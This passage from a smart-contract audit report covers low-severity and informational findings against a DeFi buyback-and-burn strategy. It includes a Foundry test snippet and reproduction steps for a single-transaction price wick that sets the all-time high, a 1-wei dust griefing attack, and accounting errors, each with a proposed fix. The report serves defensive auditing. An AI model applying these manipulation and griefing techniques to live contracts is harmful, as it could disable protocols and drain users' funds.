        uint256 bought = token.balanceOf(address(this)) - before;
        (uint64 anchoredBlock,,,,) = strat.anchor();
        assertEq(anchoredBlock, block.number);
        assertGt(strat.marketCap(), mcap0 * 3, "pump should have moved the pool far past one step");

        // Dump back in the same transaction; the block's anchor is already written.
        swapRouter.swap(
            key,
            SwapParams(true, -int256(bought), TickMath.MIN_SQRT_PRICE + 1),
            PoolSwapTest.TestSettings(false, false),
            ""
        );

        // Next hour: the first reading closes the previous hour at its last reading, the pumped one.
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);
        vault.onFeeReceived(address(arb)); // permissionless on the vault; forwards to the strategy

        // Expected: the first anchor is stepped from the deploy tick, so the hourly close and the
        // ATH can be at most ~2.02% (200 ticks) above the deploy market cap. Actual: ~3.8x.
        assertLe(strat.athMcap(), mcap0 * 10202 / 10000, "a single-tx wick became the ATH");
    }
}
```

### 5. Low: Fees that arrive between deployment and installation are counted as spendable, contrary to 'spends only fees that arrive after it is installed'

`src/DrawdownBurnStrategy.sol:222`

```
        accounted = vault_.totalReceived(reserve_);
```

The baseline for fresh fees is fixed in the constructor, not when the strategy becomes the vault's strategy and owner. Every ARB fee the hook banks between the deploy transaction and the owner's later vault.setStrategy()/transferOwnership() (separate transactions, trading continues meanwhile) is above the snapshot, so the first _observe after installation splits it into pot/pendingWall and spends it, although by the README's definition it was banked before installation. Different root cause from the unsynced-balance finding (timing of the baseline rather than what the counter includes), so it needs a different fix: an owner-only install()/start() step that sets accounted = vault.totalReceived(reserve) when the strategy is activated, or a re-baseline inside the first _observe when the strategy first finds itself installed, or a documented requirement that deploy and install happen atomically from a contract. Reported by audit_flow (7a71, second test) and audit_permissions (86f9); both reproduced. The strategy also has no passthrough for vault.setStrategy, so if ownership is transferred to it before setStrategy the only recovery is releaseVault() (audit_permissions, info): an explicit install step would close both.

**Reproduction**

Vault synced with a 100 ARB bank, no strategy set. Deploy the strategy: accounted == 100e18. Before setStrategy, a seller swaps 1e22 tokens: the hook banks ~3.26e20 ARB into totalReceived with no strategy to notify. Then vault.setStrategy(strategy), vault.transferOwnership(strategy), next block buyback(). Expected: the vault still holds 100e18 + 3.26e20 (both banked before installation). Actual: the 3.26e20 is split and the buyback spends it; vault balance returns to 100e18. Reproduced with the audit_flow proof test_feesBetweenDeployAndInstallAreSpent (fails: 'fees banked before installation were spent: 100000000000000000000 != 425762151351030228620').

### 6. Low: withdrawFromVault reconciles pot/pendingWall before the reserve its own withdraw just credited is split, leaving the counters above the vault balance and buildWall reverting

`src/DrawdownBurnStrategy.sol:657`

```
        vault.withdraw(token_, to, amount);
```

vault.withdraw syncs first, so any reserve the vault holds uncredited (a plain transfer, or fees recorded by the vault but not yet observed because an in-swap call was cut short) is added to totalReceived during the withdrawal. The reconciliation that follows (lines 659-665) compares pot+pendingWall against the post-withdraw balance and shrinks them only to that balance; the next _observe then splits the same amount (total - accounted) on top, so pot+pendingWall exceeds the vault's reserve by exactly that amount, permanently. _build does not cap at the balance, so buildWall reverts inside vault.withdraw (ERC20InsufficientBalance) whenever pendingWall exceeds the balance, until enough new fees arrive or the owner calls withdrawFromVault(reserve, to, 0) again; _due caps at the whole vault balance including any remaining bank, so a phantom pot spends bank ARB. Merged from audit_math (0cd0), audit_permissions (3452) and audit_economics (eb64). Fix: at the top of withdrawFromVault call vault.sync(reserve) and then _observe(), so everything the vault has received is split before the balance comparison (_observe alone misses unsynced transfers because it reads totalReceived).

**Reproduction**

ATH at the market so a fee goes entirely to pendingWall. Block 101: a 1e22-token sell banks F = 3.26e20 ARB; pendingWall() == F == vault balance, pot() == 0. Transfer 50e18 ARB directly to the vault without syncing. Owner calls withdrawFromVault(ARB, owner, F + 50e18 - 1e17): vault balance is 1e17 and pendingWall is reconciled to 1e17. Block 102: vault.onFeeReceived(ARB) (any reading). Expected: pot()+pendingWall() <= 1e17 and buildWall succeeds. Actual: pot()+pendingWall() == 50.1e18 against a 1e17 balance, and buildWall() reverts. Reproduced with test/scratch/Judge.t.sol test_withdrawFromVaultLeavesCountersAboveBalance (expectRevert on buildWall satisfied; final assert fails: 'counters exceed the vault balance: 50100000000000000000 > 100000000000000000').

### 7. Low: One wei of token sent to the strategy turns the next in-swap call into a dust burn and skips the buyback that swap should have run

`src/DrawdownBurnStrategy.sol:250`

```
        if (token.balanceOf(address(this)) != 0) {
```

onFeeReceived takes the burn-only branch whenever the strategy holds any token and returns without calling _due()/buyInside. The balance is externally writable: anyone can transfer 1 wei of the token to the strategy (one checkpointed transfer, well under a cent on Arbitrum), so a griefer who keeps a wei present before each sell, or a seller who does it right before dumping, converts every in-swap buyback into a 1-wei burn; the pot accumulates and is only spent when someone pays for buyback(). Together with the planted-ticks finding this is the second cheap way to disable the on-trade automation. Merged from audit_math (0e9f), audit_permissions (df8e) and audit_economics (e706). Fix: track what the strategy's own buybacks bought in storage (set in _buy, cleared in _burnHeld) and branch on that rather than on balanceOf, burning any dust alongside the next buy; or after burning a balance below a threshold continue to the buy when gas permits.

**Reproduction**

State: ATH far above the market (100% of fees to the pot), pot 0, no tokens held. Block 101: griefer calls token.transfer(strategy, 1); a trader sells 1e22 tokens. Expected: the sell's fee is split and spent inside that swap (BoughtBack). Actual: Burned(1) is emitted, onFeeReceived returns at line 252, totalSpent() == 0, totalBurned() == 1, pot() == 3.26e20. Block 102, the same sell without the dust: BoughtBack 6.45e20 inside the swap. Reproduced with test/scratch/Judge.t.sol test_oneWeiDustSkipsInSwapBuyback.

### 8. Info: 'Once per block', the anchor step and lastBuy are keyed on block.number, which on Arbitrum One is the L1 block number (~12 s)

`src/DrawdownBurnStrategy.sol:392`

```
        if (a.block_ != block.number) {
```

ERC20Checkpoints.sol in this repository notes that block.number on Arbitrum is the L1 block number and uses timestamps instead; the strategy keys the anchor, the block's tier and the buyback's once-per-block limit on block.number. One 'block' here therefore spans every L2 block sharing an L1 block number (typically ~12 s, longer during L1 delays): the first swap in that window fixes the tier and the buyback for every later swap in it, at most one buyback runs per ~12 s, and the free anchor walk in the ATH finding advances once per L1 block. If per-L1-block behaviour is intended, document it; if per-L2-block was intended, key on block.timestamp (as the token does) or ArbSys.arbBlockNumber(). Reported by audit_permissions (31bb); confirmed from the repository's own note and Arbitrum's documented semantics, not reproducible in the local harness.

**Reproduction**

On Arbitrum One, two swaps 3 seconds apart with the same L1 block number: the second sees anchor.block_ == block.number (line 392) and anchor.lastBuy == block.number (line 426), so it gets no new anchor, no new tier and no buyback. Expected per the NatSpec ('once a block', 'read once per block'): a new anchor and buyback in a new L2 block. Actual: shared with the earlier swap for the rest of the L1 block.

---

Judge's submission `430485e53da3a6b1ab0d67d137c852b1a552f7ec6c0291712003c82938fa9a23`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
